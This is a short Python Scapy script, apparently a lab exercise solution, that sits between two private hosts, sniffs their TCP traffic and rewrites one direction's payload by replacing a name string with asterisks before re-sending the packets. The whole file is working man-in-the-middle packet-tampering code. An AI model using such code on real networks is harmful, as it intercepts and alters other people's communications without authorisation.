from scapy.all import *

replace_word = 'JoshGehlAustinFormagin'	# String to be replaced in packet payload

def spoof_pkt(pkt):
	if pkt[IP].src == '10.0.2.4' and pkt[IP].dst == '10.0.2.5':	# Packet from A to B
		newpkt = IP(bytes(pkt[IP]))	# Create new packet

		del(newpkt.chksum)		# Delete checksums and payload
		del(newpkt[TCP].payload)	# Scapy will regenerate correct checksums
		del(newpkt[TCP].chksum)

		if pkt[TCP].payload:	# If packet has payload
			data = pkt[TCP].payload.load.decode()	# Get data

			# Replace every occurance of 'JoshGehlAustinFormagin' with asterisks
			newdata = data.replace(replace_word, '*' * len(replace_word))

			# print(data, '->', newdata)	# Print to console

			send(newpkt/str.encode(newdata), verbose=0)	# Send packet
		else:	# If packet has no payload

			send(newpkt, verbose=0)	# Forward packet unmodified

	elif pkt[IP].src == '10.0.2.5' and pkt[IP].dst == '10.0.2.4':	# Packet from B to A
		newpkt = IP(bytes(pkt[IP]))	# Create new packet

		del(newpkt.chksum)		# Delete checksums, Scapy will regen them
		del(newpkt[TCP].chksum)
	
		send(newpkt, verbose=0)		# Sent packet unmodified

# Begin sniffing packets over ethernet interface
pkt = sniff(iface='enp0s3', filter='tcp and host 10.0.2.4', prn=spoof_pkt)
